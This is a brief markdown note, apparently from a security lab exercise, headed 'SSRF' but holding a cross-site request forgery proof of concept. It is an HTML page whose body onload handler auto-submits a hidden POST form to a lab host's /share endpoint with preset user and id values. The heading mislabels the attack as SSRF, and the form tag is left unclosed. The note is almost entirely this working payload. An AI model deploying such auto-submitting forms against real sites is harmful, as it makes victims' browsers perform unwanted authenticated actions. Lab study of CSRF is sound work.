
# SSRF

```html
<html>
    <body onload=document.getElementById("csrf").submit()>
        <!-- The endpoint that you are trying to forge a request to -->
        <form id="csrf" action="http://ptl-a2f0cd87-db9ad143.libcurl.so/share" method="POST">
            <!-- From original POST request with data: "user=test&id=0" -->
            <!-- Recreate this with form inputs -->
            <input name="user" value="test">
            <input name="id" value="0">
            
    </body>
</html>
```
